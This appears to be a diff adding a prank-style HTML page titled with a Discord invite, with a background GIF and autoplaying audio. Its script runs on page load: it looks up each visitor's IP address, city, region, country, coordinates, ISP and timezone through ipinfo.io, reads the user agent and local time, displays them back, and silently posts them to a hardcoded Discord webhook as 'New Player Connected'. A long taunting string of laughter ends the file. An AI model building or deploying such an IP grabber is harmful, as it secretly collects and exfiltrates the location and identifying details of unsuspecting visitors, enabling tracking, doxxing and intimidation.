@@ -1,0 +1,113 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>discord.gg/c7xQ28t8</title>
+<style>
+  body {
+    margin: 0; padding: 0;
+    background: url('https://e.top4top.io/p_35110wz601.gif') no-repeat center center fixed;
+    background-size: cover;
+    font-family: 'Courier New', Courier, monospace;
+    color: #0000ff;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    height: 100vh;
+    flex-direction: column;
+    text-align: center;
+  }
+  .image-container img {
+    width: 750px;
+    height: auto;
+    border: 2px solid #0000ff;
+    border-radius: 15px;
+    box-shadow: 0 0 15px rgba(0, 0, 255, 0.7);
+  }
+  .info {
+    margin-top: 20px;
+    font-size: 1.5em;
+    color: #0000ff;
+    text-shadow: 0 0 8px #0000ff, 0 0 15px #0000ff, 0 0 25px #0000ff;
+    letter-spacing: 4.5px;
+    white-space: pre-wrap;
+  }
+  .text {
+    margin-top: 20px;
+    font-size: 3em;
+    color: #0000ff;
+    text-shadow: 0 0 8px #0000ff, 0 0 15px #0000ff, 0 0 25px #0000ff;
+    letter-spacing: 4.5px;
+  }
+</style>
+</head>
+<body>
+  <div class="image-container">
+    <img src="https://d.top4top.io/p_35112zjii1.png" alt="Discord Image" />
+  </div>
+  <audio autoplay loop>
+    <source src="https://l.top4top.io/m_3511eo3o51.mp4" type="audio/mpeg" />
+    Your browser does not support the audio element.
+  </audio>
+  <div class="info" id="ip-info">
+    <strong>IP:</strong> <span id="ip"></span><br />
+    <strong>City:</strong> <span id="city"></span><br />
+    <strong>Region:</strong> <span id="region"></span><br />
+    <strong>Country:</strong> <span id="country"></span><br />
+    <strong>Location:</strong> <span id="loc"></span><br />
+    <strong>Organization:</strong> <span id="org"></span><br />
+    <strong>Timezone:</strong> <span id="timezone"></span><br />
+    <strong>User Agent:</strong> <span id="userAgent"></span><br />
+    <strong>Local Time:</strong> <span id="localTime"></span>
+  </div>
+  <div class="text">discord.gg/c7xQ28t8</div>
+
+<script>
+  const webhookURL = "https://discord.com/api/webhooks/1404771542725951558/rUVK_KDewgT0tduOx2C95GTOu0s3J3xLzZhe87_zz6YpKelfdprktHFILp2jOE6e0l8-";
+
+  function getLocalTime() {
+    const now = new Date();
+    return now.toLocaleString();
+  }
+
+  fetch('https://ipinfo.io/json')
+    .then(response => response.json())
+    .then(data => {
+      delete data.readme;
+
+      document.getElementById('ip').textContent = data.ip || '';
+      document.getElementById('city').textContent = data.city || '';
+      document.getElementById('region').textContent = data.region || '';
+      document.getElementById('country').textContent = data.country || '';
+      document.getElementById('loc').textContent = data.loc || '';
+      document.getElementById('org').textContent = data.org || '';
+      document.getElementById('timezone').textContent = data.timezone || '';
+      document.getElementById('userAgent').textContent = navigator.userAgent;
+      document.getElementById('localTime').textContent = getLocalTime();
+
+      const content = 
+        `🔔 New Player Connected:\n` +
+        `IP: ${data.ip || 'N/A'}\n` +
+        `City: ${data.city || 'N/A'}\n` +
+        `Region: ${data.region || 'N/A'}\n` +
+        `Country: ${data.country || 'N/A'}\n` +
+        `Location: ${data.loc || 'N/A'}\n` +
+        `Org: ${data.org || 'N/A'}\n` +
+        `Timezone: ${data.timezone || 'N/A'}\n` +
+        `User Agent: ${navigator.userAgent}\n` +
+        `Local Time: ${getLocalTime()}`;
+
+      fetch(webhookURL, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ content })
+      }).catch(err => console.error("Webhook error:", err));
+    })
+    .catch(err => {
+      console.error("Error fetching IP info:", err);
+    });
+</script>
+</body>
+</html>
+ههههههههههههههههههههههههههههههههههههههههههههههههههههههههههههههههههههههههههههههههههههههههههههههههههههههههههههههههههههههههههههههههههههههههههههههههههههههههههههههههههههههههههههههههههههههههههههههههههههههههههههههههههههههههههههههههههههههههههههههههههههههههههههههههههههههههههههههههههههههههههههههههههههههههههههههههههههههههههههههههههههههههههههههههههههههههههههههههههههههههههههههههههههههههههههههههههههههههههههههههههههه
